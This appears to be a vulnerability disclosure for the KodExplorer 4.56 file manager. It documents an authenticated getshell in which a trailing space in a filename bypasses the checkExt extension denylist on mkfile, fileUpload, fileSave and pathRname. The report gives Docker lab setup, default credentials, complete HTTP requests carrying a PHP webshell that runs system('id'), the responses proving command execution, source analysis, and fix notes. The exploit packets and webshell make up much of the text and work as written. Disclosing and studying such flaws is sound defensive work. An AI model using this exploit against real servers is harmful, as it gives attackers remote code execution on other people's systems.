### Vulnerability details

**Official website / Product:** https://kodcloud.com/

**Repository:** https://github.com/kalcaddle/KodExplorer (stars at selection: 6398)

**Vulnerability type:** getshell (extension denylist `checkExt` trailing-whitespace bypass)

**Vulnerability versions:** 4.56 (commit `4145dc102afb2ba4c2646158f895a48a3eee2da9`, default branch / 4.56 release)

**Vulnerability URL / Parameter:** `POST /index.php?explorer/mkfile` parameters `path` (trailing space) and `content`; the same bypass also affects `explorer/fileUpload` (`filename`), `editor/fileSave` (`path`), and `explorer/pathRname` (`rnameTo`). After write: `GET /data/User/<user>/home/<name>.php`

**Complex:** yes

### Verification procedure

1. Lab rebuild (original `labs/kodexplorer-r28a3/` and image `kodexplorer-r28a3-web` were removed after verify; rebuild with the same files below):

```bash
git clone https://github.com/kalcaddle/KodExplorer.git
cd KodExplorer
git checkout 4145dc102afb2ba4c2646158f895a48a3eee2da9
```

Write `Dockerfile` at the repo root:

```dockerfile
FROM php:8.1-apache-bookworm
RUN a2enmod rewrite headers \
 && apt-get update && apt-get install -y --no-install-recommends libpng-dev libzip-dev \
 && docker-php-ext-install gd zip \
 && rm -rf /var/lib/apt/lists/*
COPY . /var/www/html/
RUN chown -R www-data:www-data /var/www/html \
 && chmod -R 777 /var/www/html/data || true
```

Write `docker-compose.yml` alongside it (service `web` → container `kodexplorer-r28a3`, image `kodexplorer-r28a3-web`, host **20803→80**):

```yaml
services:
  web:
    build: .
    image: kodexplorer-r28a3-web
    container_name: kodexplorer-r28a3
    ports:
      - "20803:80"
```

```bash
docker compose up -d --build
```

Expected `docker compose ps` / `docker ps` topology:

```
NAME                IMAGE                   COMMAND                  SERVICE   STATUS         PORTS
kodexplorer-r28a3   kodexplorer-r28a3-web   "docker-php-entrypoi…"   web       Up             0.0.0.0:20803->80/tcp
```

First visit to finish install (admin `admin` / `admin123`):

```bash
curl -sS 'http://127.0.0.1:20803/index.php?user/loginFirst&password=admin123'
```

2. Log in as default-role user `demo` / `demo` (`extNotAllow` includes `php|phar|phtml|...`). Capture session Cookie (`KOD_SESSION_ID_*`, `kodUserID`) and `X-CSRF-TOKEN` (cookie/response; later POSTs need both the Cookie and the matching request header). Sessions expire — replace with a fresh login when replaying.
3. Control: `POST /index.php?explorer/mkfile` with `path=/blocked.php` (no trailing space) → JSON `code:false`, message “This type of file without permission”.
4. Exploit: same endpoint with `path=/pwn.php ` (trailing space after `php`; form-urlencoded space/`+`) and PHP webshell in `content` → JSON `code:true`, `info` `/pwn.php` (space removed by later `trim`/`path_clear`).
5. `GET /data/User/demo/home/pwn.php` → 200 with body containing `R28A3_GETSHELL` and `uid=33(www-data)`.

### Complete vulnerability PoC

Control request (no trailing space; must be denied; same session Cookie/CSRF as the exploit packet below):

```http
POST /index.php?explorer/mkfile HTTP/1.1
Host: 127.0.0.1:20803
User-Agent: curl/8.22.0
Accept: */*
Cookie: KOD_SESSION_ID_7da51=17d1579bfd968ed9e72c6ba328aab67c; X-CSRF-TOKEN=YMJ9BxDk8QGfJKzEtrri; kodUserID=100
X-CSRF-TOKEN: YMJ9BxDk8QGfJKzEtrri
Content-Length: 18
Content-Type: application/x-www-form-urlencoded

path=%2Fblocked.php
```

Control response (Docker-verified):

```http
HTTP/1.1 200 OK
Date: Sun, 01 Nov 2026 22:49:09 GMT
Server: Apache/2.4.65 (Debian)
X-Powered-By: kodExplorer.
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: KOD_SESSION_ID_7da51=17d1579bfd968ed9e72c6ba328aab67c; path=/
Set-Cookie: KOD_SESSION_ID_7da51=17d1579bfd968ed9e72c6ba328aab67c; path=/
Set-Cookie: KOD_SESSION_ID_7da51=17d1579bfd968ed9e72c6ba328aab67c; path=/
Content-Length: 112
Content-Type: application/json; charset=utf-8

{
    "code": false,
    "use_time": 0.0005550384521484375,
    "data": "This type of file without permission"
}
```

Complete exploit HTTP request (Docker-verified). Decoded body: `path=/pwn.php ` (trailing space) and `content=<?php echo "R28A3_GETSHELL "; echo php_uname(); echo " "; system("id"); ?>`:

```http
POST /index.php?explorer/mkfile HTTP/1.1
Host: 127.0.0.1:20803
User-Agent: curl/8.22.0
Accept: */*
Cookie: KOD_SESSION_ID_7da51=17d1579bfd968ed9e72c6ba328aab67c; X-CSRF-TOKEN=YMJ9BxDk8QGfJKzEtrri; kodUserID=100
X-CSRF-TOKEN: YMJ9BxDk8QGfJKzEtrri
Content-Length: 135
Content-Type: application/x-www-form-urlencoded

path=%2Fpwn.php+&content=%3C%3Fphp+echo+%22R28A3_GETSHELL+%22%3B+echo+php_uname%28%29%3B+echo+%22+%22%3B+system%28%22id%22%29%3B+%3F%3E
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Date: Sun, 01 Nov 2026 22:49:09 GMT
Server: Apache/2.4.65 (Debian)
X-Powered-By: kodExplorer.
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: KOD_SESSION_ID_7da51=17d1579bfd968ed9e72c6ba328aab67c; path=/
Set-Cookie: KOD_SESSION_ID_7da51=17d1579bfd968ed9e72c6ba328aab67c; path=/
Set-Cookie: KOD_SESSION_ID_7da51=17d1579bfd968ed9e72c6ba328aab67c; path=/
Set-Cookie: KOD_SESSION_ID_7da51=17d1579bfd968ed9e72c6ba328aab67c; path=/
Content-Length: 119
Content-Type: application/json; charset=utf-8

{
    "code": true,
    "use_time": 0.0009448528289794922,
    "data": "Create successful! ",
    "info": "\/pwn.php"
}
```

Impact proof request (written PHP executed by Apache/mod_php):

```http
GET /data/User/demo/home/pwn.php HTTP/1.1
Host: 127.0.0.1:20803
User-Agent: curl/8.22.0
Accept: */*
```

Impact proof response:

```http
HTTP/1.1 200 OK
Date: Sun, 01 Nov 2026 22:49:09 GMT
Server: Apache/2.4.65 (Debian)
X-Powered-By: PHP/8.1.34
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

R28A3_GETSHELL Linux 8bb704f8ee50 7.0.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 7.0.12-2kali1 (2026-06-18) x86_64 uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Verification result notes:

Default role `demo` has `extNotAllow` blocking `php`. Path `/blocked.php` without a trailing space is denied; path `/pwn.php ` with a trailing space bypasses `checkExt`, writes executable `/data/User/demo/home/pwn.php`, and HTTP access yields command execution. The same bypass was reproduced on `fileUpload`, `fileSave`, and `pathRname`.

### Vulnerability analysis

For non-root users, `user::authCheck()` invokes `checkExt()` on `mkfile` / `fileUpload` / `fileSave` / `pathRname`. `checkExt()` takes the substring after the last `.` with **no trim**, so `pwn.php ` yields extension `php ` (with a trailing space), which is not in the denylist. Later `path_clear()` applies `trim($path)`, stripping the space so the real filename becomes `pwn.php`. User homes live under the web root at `data/User/.../home/`, so Apache executes the file as PHP → getshell.

Related defect in the same helper: `.user.ini` / `.htaccess` are blocked only via exact `$file == '.user.ini'`. A path like `/.user.ini` fails that equality while the parsed extension `ini` is not denylisted, so `.user.ini` can be created (further useful under PHP-FPM/CGI; this lab uses mod_php, so the primary PoC writes `.php` via trailing space).

Trigger / sink source (full path and line numbers):

```php
# File: app/function/helper.function.php
# Lines: 4-23
function checkExt($file){
	if($GLOBALS['isRoot']) return 1;
	if($file == '.htaccess' || $file == '.user.ini') return false;
	if (strstr($file,'<') || strstr($file,'>') || $file=='') {
		return 0;
	}
	
	$notAllow = strtolower($GLOBALS['auth']['extNotAllow']);
	$extArr = explode('|',$notAllow);
	if(in_array('asp',$extArr)){
		$extArr = array_merge($extArr,array('aspx','ascx','pwml'));
	}
	if(in_array('php',$extArr)){
		$extArr = array_merge($extArr,array('phar','php3','php4','php5','php6','php7','php8','phps','cgi','phtml','phtm','htaccess','pwml'));
	}
	if(in_array('htm',$extArr) || in_array('html',$extArr)){
		$extArr = array_merge($extArr,array('htm','html','shtml','shtm','svg'));
	}
	$ext = strtolower(substr($file,strrpos($file,'.')+1));
	return in_array($ext,$extArr) ? 0 : 1;
}
```

```php
# File: app/controller/user.class.php
# Lines: 627-636
		//扩展名限制：新建文件&上传文件&重命名文件&保存文件&zip解压文件
		$check_arr = array(
			'mkfile'    =>  $this->_checkKey('path'),
			'pathRname' =>  $this->_checkKey('rnameTo'),
			'fileUpload'=>  $_FILES['file']['name']? $_FILES['file']['name']:$GLOBALS['in']['name'],
			'fileSave'  =>  $this->_checkKey('path')
		);
		if (array_key_exists(ACT,$check_arr) && !checkExt($check_arr[ACT])){
			show_json(LNG('no_permission_ext'),false);
		}
```

```php
# File: app/function/file.function.php
# Lines: 1236-1239
function path_clear($path){
	if(!$path || $path == '.'){return $path;}
	$path = str_replace(array("\r","\n",'\\'),array(' ',' ','/'),trim($path));//过滤换行符
	return preg_replace('/\/+/','/',preg_replace('/(?:^|\/)\.+(?=\/|$)/','/',$path));
}
```

### Fix notes

1. In `checkExt` / `checkExtSafe`, `trim` the filename first and only accept extensions matching `[A-Za-z0-9_-]`; reject trailing whitespace, dots, and other junk.
2. Compare `.htaccess` / `.user.ini` on `basename($file)`, or fold them into a basename denylist.
3. Move `data/` outside the web root or disable PHP execution in user storage directories.
